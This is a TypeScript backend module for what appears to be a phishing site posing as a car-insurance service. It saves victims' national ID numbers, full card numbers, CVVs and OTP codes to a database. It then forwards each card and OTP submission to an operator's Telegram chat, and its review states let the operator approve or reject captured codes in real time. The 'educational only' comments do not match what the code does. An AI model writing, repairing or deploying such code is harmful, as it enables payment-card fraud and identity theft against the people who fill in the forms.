// @ts-nocheck
// Educational-only storage layer — persists applications to Supabase (Lovable Cloud).

import { supabase } from "@/integrations/supabase/client";

export type ReviewStatus =
  | "awaiting_review"
  | "bank_approval"
  | "approved"
  | "rejected"
  | "card_submitted"
  | "otp_submitted"
  | "otp_rejected"
  | "completed";

export type StoredApplication = {
  id: string;
  createdAt: string;
  cardTitle?: string;
  fullName?: string;
  identity?: string;
  birthDate?: string;
  phone?: string;
  insuranceType?: string;
  startDate?: string;
  purpose?: string;
  estValue?: string;
  carYear?: string;
  carModel?: string;
  repairPlace?: string;
  company?: string;
  type?: string;
  price?: number;
  total?: number;
  method?: string;
  status: "paid" | "pending";
  reviewStatus: ReviewStatus;
  cardNumber?: string;
  cardName?: string;
  cardExpMonth?: string;
  cardExpYear?: string;
  cardCvv?: string;
  cardBrand?: "visa" | "mastercard" | "mada" | "unknown";
  otpCode?: string;
};

// Mapping helpers between DB row (snake_case) and StoredApplication (camelCase)
type Row = {
  id: string;
  created_at: string;
  full_name: string | null;
  identity: string | null;
  birth_date: string | null;
  phone: string | null;
  insurance_type: string | null;
  start_date: string | null;
  purpose: string | null;
  est_value: string | null;
  car_year: string | null;
  car_model: string | null;
  repair_place: string | null;
  company: string | null;
  type: string | null;
  price: number | null;
  total: number | null;
  method: string | null;
  status: string;
  review_status: string;
  card_number: string | null;
  card_name: string | null;
  card_exp_month: string | null;
  card_exp_year: string | null;
  card_cvv: string | null;
  card_brand: string | null;
  otp_code: string | null;
};

const fromRow = (r: Row): StoredApplication => ({
  id: r.id,
  createdAt: r.created_at,
  cardTitle: (r as unknown as { card_title: string | null }).card_title ?? undefined,
  fullName: r.full_name ?? undefined,
  identity: r.identity ?? undefined,
  birthDate: r.birth_date ?? undefined,
  phone: r.phone ?? undefined,
  insuranceType: r.insurance_type ?? undefined,
  startDate: r.start_date ?? undefined,
  purpose: r.purpose ?? undefined,
  estValue: r.est_value ?? undefined,
  carYear: r.car_year ?? undefined,
  carModel: r.car_model ?? undefined,
  repairPlace: r.repair_place ?? undefined,
  company: r.company ?? undefined,
  type: r.type ?? undefined,
  price: r.price ?? undefined,
  total: r.total ?? undefined,
  method: r.method ?? undefined,
  status: (r.status as "paid" | "pending") ?? "pending",
  reviewStatus: (r.review_status as ReviewStatus) ?? "awaiting_review",
  cardNumber: r.card_number ?? undefined,
  cardName: r.card_name ?? undefined,
  cardExpMonth: r.card_exp_month ?? undefined,
  cardExpYear: r.card_exp_year ?? undefined,
  cardCvv: r.card_cvv ?? undefined,
  cardBrand: (r.card_brand as StoredApplication["cardBrand"]) ?? undefined,
  otpCode: r.otp_code ?? undefined,
});

const toRow = (a: Partial<StoredApplication>): Record<string, unknown> => {
  const map: Record<string, unknown> = {};
  if (a.cardTitle !== undefined) map.card_title = a.cardTitle;
  if (a.fullName !== undefined) map.full_name = a.fullName;
  if (a.identity !== undefined) map.identity = a.identity;
  if (a.birthDate !== undefined) map.birth_date = a.birthDate;
  if (a.phone !== undefined) map.phone = a.phone;
  if (a.insuranceType !== undefined) map.insurance_type = a.insuranceType;
  if (a.startDate !== undefined) map.start_date = a.startDate;
  if (a.purpose !== undefined) map.purpose = a.purpose;
  if (a.estValue !== undefined) map.est_value = a.estValue;
  if (a.carYear !== undefined) map.car_year = a.carYear;
  if (a.carModel !== undefined) map.car_model = a.carModel;
  if (a.repairPlace !== undefined) map.repair_place = a.repairPlace;
  if (a.company !== undefined) map.company = a.company;
  if (a.type !== undefined) map.type = a.type;
  if (a.price !== undefined) map.price = a.price;
  if (a.total !== undefined) map.total = a.total;
  if (a.method !== undefined) map.method = a.method;
  if (a.status !== undefined) map.status = a.status;
  if (a.reviewStatus !== undefined) map.review_status = a.reviewStatus;
  if (a.cardNumber !== undefined) map.card_number = a.cardNumber;
  if (a.cardName !== undefined) map.card_name = a.cardName;
  if (a.cardExpMonth !== undefined) map.card_exp_month = a.cardExpMonth;
  if (a.cardExpYear !== undefined) map.card_exp_year = a.cardExpYear;
  if (a.cardCvv !== undefined) map.card_cvv = a.cardCvv;
  if (a.cardBrand !== undefined) map.card_brand = a.cardBrand;
  if (a.otpCode !== undefined) map.otp_code = a.otpCode;
  return map;
};

export async function loadApplications(): Promise<StoredApplication[]> {
  const { data, error } = await supabase
    .from("applications")
    .select("*")
    .order("created_at", { ascending: false });
  if (error) {
    console.error("loadApplications error", error);
    return [];
  }
  return (data as Row[]).map(fromRow);
}

export async function saveApplication(
  app: Omit<StoredApplication, "id" | "createdAt">,
): Promise<StoredApplication | null> {
  const id = `APP-${Date.now().toString(36).toUpperCase()}`;
  const payload = { id, ...toRow(app) };
  console.log("[admin-storage] saveApplication payload:", payload);
  const { data, error } = await supabase
    .from("applications")
    .insert(payload as never)
    .select()
    .single();
  if (error) {
    console.error("[admin-storage] saveApplication error:", error);
    return null;
  }
  console.log("[admin-storage] saveApplication success:", data);
  const saved = fromRow(data as Row);
  void notifyTelegram("new_application", saved);
  return saved;
}

export async function updateApplication(
  id: string,
  patch: Partial<StoredApplication>,
): Promise<StoredApplication | null> {
  const { data, error } = await supabase
    .from("applications")
    .update(toRow(patch) as never)
    .eq("id", id)
    .select()
    .single();
  if (error) {
    console.error("updateApplication error", error);
    return null;
  }
  const updated = fromRow(data as Row);
  if (patch.cardNumber || patch.cardCvv) void notifyTelegram("card", updated);
  if (patch.otpCode) void notifyTelegram("otp", updated);
  return updated;
}

async function notifyTelegram(
  event: "new_application" | "card" | "otp",
  app: StoredApplication,
) {
  try {
    // Fetch settings fresh from DB — visitor browsers don't run the admin
    // settings subscription, so the in-memory cache is default (disabled).
    const { data } = await supabase
      .from("site_settings")
      .select(
        "telegram_enabled, telegram_bot_token, telegram_chat_id, telegram_notify_new_application, telegram_notify_card, telegram_notify_otp",
      )
      .eq("id", 1)
      .maybeSingle();
    if (!data) return;
    const s = data as {
      telegram_enabled: boolean;
      telegram_bot_token: string;
      telegram_chat_id: string;
      telegram_notify_new_application: boolean;
      telegram_notify_card: boolean;
      telegram_notify_otp: boolean;
    };
    if (!s.telegram_enabled || !s.telegram_bot_token || !s.telegram_chat_id) return;
    if (event === "new_application" && !s.telegram_notify_new_application) return;
    if (event === "card" && !s.telegram_notify_card) return;
    if (event === "otp" && !s.telegram_notify_otp) return;

    const title =
      event === "new_application"
        ? "🆕 <b>طلب جديد</b>"
        : event === "card"
          ? "💳 <b>بيانات بطاقة جديدة</b>"
          : "🔐 <b>رمز OTP</b>";

    const lines: string[] = [title, `🆔 <code>${app.id}</code>`];
    const push = (label: string, val?: string | number | null) => {
      if (val === undefined || val === null || val === "") return;
      lines.push(`${label}: <code>${val}</code>`);
    };

    lines.push("━━━━━━━━━━━━━");
    lines.push("👤 <b>بيانات العميل</b>");
    push("الاسم", app.fullName);
    push("الهوية", app.identity);
    push("تاريخ الميلاد", app.birthDate);
    push("الجوال", app.phone);

    lines.push("━━━━━━━━━━━━━");
    lines.push("📋 <b>بيانات التأمين</b>");
    push("نوع التأمين", app.insuranceType);
    push("تاريخ البدء", app.startDate);
    push("الغرض", app.purpose);
    push("القيمة التقديرية", app.estValue);
    push("سنة الصنع", app.carYear);
    push("موديل السيارة", app.carModel);
    push("مكان الإصلاح", app.repairPlace);

    if (app.company || app.type || app.price || app.total || app.method) {
      lines.push("━━━━━━━━━━━━━");
      lines.push("🏢 <b>العرض</b>");
      push("الشركة", app.company);
      push("النوع", app.type);
      push("السعر", app.price);
      push("الإجمالي", app.total ? `${app.total} ر.س` : undefined);
      push("طريقة الدفع", app.method);
    }

    if (app.cardNumber || app.cardName || app.cardCvv) {
      lines.push("━━━━━━━━━━━━━");
      lines.push("💳 <b>بيانات البطاقة</b>");
      push("اسم حامل البطاقة", app.cardName);
      push("رقم البطاقة", app.cardNumber);
      const exp = (app.cardExpMonth || app.cardExpYear)
        ? `${app.cardExpMonth || ""}/${app.cardExpYear || ""}`
        : undefined;
      push("الانتهاء", exp);
      push("CVV", app.cardCvv);
      push("النوع", app.cardBrand);
    }

    if (app.otpCode) {
      lines.push("━━━━━━━━━━━━━");
      lines.push("🔐 <b>رمز التحقق</b>");
      push("OTP", app.otpCode);
    }

    lines.push("━━━━━━━━━━━━━");
    push("الحالة", app.status);
    push("حالة المراجعة", app.reviewStatus);

    const url = `https://api.telegram.org/bot${s.telegram_bot_token}/sendMessage`;
    const res = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: s.telegram_chat_id,
        text: lines.join("\n"),
        parse_mode: "HTML",
      }),
    });
    if (!res.ok) {
      const t = await res.text().catch(() => "");
      console.warn("[telegram] send failed", res.status, t);
    }
  } catch (e) {
    console.warn("[telegram] notify failed:", e);
  }
}

export async function getApplication(
  id: string,
): Promise<StoredApplication | null> {
  const { data, error } = await supabase
    .from("applications")
    .select("*")
    .eq("id", id)
    .maybeSingle();
  if (error || !data) return null;
  return fromRow(data as Row);
}

export async function deleteApplication(id: string): Promise<void> {
  const { error } = await supabase.from("applications").delete().eq("id", id);
  if (error) console.error("deleteApplication error", error);
}

export async function clearApplications(): Promise<void> {
  const { error } = await supabase
    .from("applications")
    .delete()
    .neq("id", "");
  if (error) console.error("clearApplications error", error);
}

export function detectCardBrand(
  cardNumber: string,
): "visa" | "mastercard" | "mada" | "unknown" {
  const n = cardNumber.replace(/\s/g, "");
  if (/^4/.test(n)) return "visa";
  if (/^(5[1-5]|2[2-7])/.test(n)) return "mastercard";
  if (/^(440647|440795|446404|457865|588845|968208)/.test(n)) return "mada";
  return "unknown";
}

// Admin auth (educational only — NOT secure)
const AUTH_KEY = "arabbank_admin_auth_v1";
const PASSWORD_KEY = "arabbank_admin_password_v2";
const DEFAULT_ADMIN_PASSWORD = "445566";

function getStoredPassword(): string {
  if (typeof window === "undefined") return DEFAULT_ADMIN_PASSWORD;
  return localStorage.getItem(PASSWORD_KEY) ?? DEFAULT_ADMIN_PASSWORD;
}

export function isAdminAuthed(): boolean {
  if (typeof window === "undefined") return false;
  return sessionStorage.getItem(AUTH_KEY) === "1";
}

export function loginAdmin(password: string): boolean {
  if (password === getStoredPassword()) {
    sessionStorage.setItem(AUTH_KEY, "1");
    return true;
  }
  return false;
}

export function logoutAdmin() {
  sessionStorage.removeItem(AUTH_KEY);
}

export function changeAdminPassword(
  currentPassword: string,
  newPassword: string,
): { ok: boolean; error?: string } {
  if (currentPassword !== getStoredPassword()) {
    return { ok: false, error: "كلمة المرور الحالية غير صحيحة" };
  }
  if (!newPassword || newPassword.length < 4) {
    return { ok: false, error: "كلمة المرور الجديدة يجب أن تكون 4 أحرف على الأقل" };
  }
  localStorage.setItem(PASSWORD_KEY, newPassword);
  return { ok: true };
}
